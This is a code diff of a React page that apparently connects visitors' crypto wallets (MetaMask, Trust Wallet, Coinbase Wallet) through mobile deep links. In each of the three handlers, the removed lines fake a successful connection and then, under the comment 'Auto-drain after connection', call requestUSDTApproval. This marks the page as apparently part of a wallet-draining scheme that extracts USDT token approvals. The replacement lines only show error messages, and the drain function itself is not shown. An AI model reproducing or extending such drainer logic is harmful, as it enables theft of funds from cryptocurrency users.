@@ -1250,30 +1250,15 @@ function FlashedPageContent() {
                             const deepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
                             window.location.href = deepLink;
                             
-                            // Fallback to simulation after 2 seconds if app doesn't open
-                            setTimeout(async () => {
-                              const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
-                              setUserAddress(mockAddress);
-                              setIsWalletConnected(true);
-                              setConnectionType('mobile_metamask');
-                              localStorage.setItem('connectedWallet', mockAddress);
-                              localStorage.setItem('connectionType', 'mobile_metamask');
-                              setShowModal(null);
-                              await startWalletScan(mockAddress);
-                              
-                              // Auto-drain after connection
-                              setTimeout(async () => {
-                                await requestUSDTApproval();
-                              }, 3000);
-                            }, 2000);
+                            // Check if connection failed after 3 seconds
+                            setTimeout(() => {
+                              if (!isWalletConnected) {
+                                setStatus('❌ MetaMask app not found. Please install MetaMask or try again.');
+                              }
+                            }, 3000);
                           }
                         } catch (error) {
-                          // Simulate connection on error
-                          const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
-                          setUserAddress(mockAddress);
-                          setIsWalletConnected(true);
-                          setConnectionType('mobile_metamask');
-                          await startWalletScan(mockAddress);
+                          setStatus('❌ Failed to connect MetaMask. Please try again or install the app.');
                         }
                       }}
                       className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
@@ -1300,30 +1285,15 @@ function FlashedPageContent() {
                             const deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
                             window.location.href = deepLink;
                             
-                            // Fallback to simulation after 2 seconds
-                            setTimeout(async () => {
-                              const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
-                              setUserAddress(mockAddress);
-                              setIsWalletConnected(true);
-                              setConnectionType('mobile_trust');
-                              localStorage.setItem('connectedWallet', mockAddress);
-                              localStorage.setItem('connectionType', 'mobile_trust');
-                              setShowModal(null);
-                              await startWalletScan(mockAddress);
-                              
-                              // Auto-drain after connection
-                              setTimeout(async () => {
-                                await requestUSDTApproval();
-                              }, 3000);
-                            }, 2000);
+                            // Check if connection failed after 3 seconds
+                            setTimeout(() => {
+                              if (!isWalletConnected) {
+                                setStatus('❌ Trust Wallet app not found. Please install Trust Wallet or try again.');
+                              }
+                            }, 3000);
                           }
                         } catch (error) {
-                          // Simulate connection on error
-                          const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
-                          setUserAddress(mockAddress);
-                          setIsWalletConnected(true);
-                          setConnectionType('mobile_trust');
-                          await startWalletScan(mockAddress);
+                          setStatus('❌ Failed to connect Trust Wallet. Please try again or install the app.');
                         }
                       }}
                       className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
@@ -1350,30 +1320,15 @@ function FlashedPageContent() {
                             const deepLink = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`;
                             window.location.href = deepLink;
                             
-                            // Fallback to simulation after 2 seconds
-                            setTimeout(async () => {
-                              const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
-                              setUserAddress(mockAddress);
-                              setIsWalletConnected(true);
-                              setConnectionType('mobile_coinbase');
-                              localStorage.setItem('connectedWallet', mockAddress);
-                              localStorage.setItem('connectionType', 'mobile_coinbase');
-                              setShowModal(null);
-                              await startWalletScan(mockAddress);
-                              
-                              // Auto-drain after connection
-                              setTimeout(async () => {
-                                await requestUSDTApproval();
-                              }, 3000);
-                            }, 2000);
+                            // Check if connection failed after 3 seconds
+                            setTimeout(() => {
+                              if (!isWalletConnected) {
+                                setStatus('❌ Coinbase Wallet app not found. Please install Coinbase Wallet or try again.');
+                              }
+                            }, 3000);
                           }
                         } catch (error) {
-                          // Simulate connection on error
-                          const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
-                          setUserAddress(mockAddress);
-                          setIsWalletConnected(true);
-                          setConnectionType('mobile_coinbase');
-                          await startWalletScan(mockAddress);
+                          setStatus('❌ Failed to connect Coinbase Wallet. Please try again or install the app.');
                         }
                       }}
                       className="flex items-center w-full bg-indigo-600 hover:bg-indigo-700 p-4 rounded-lg text-white font-semibold"
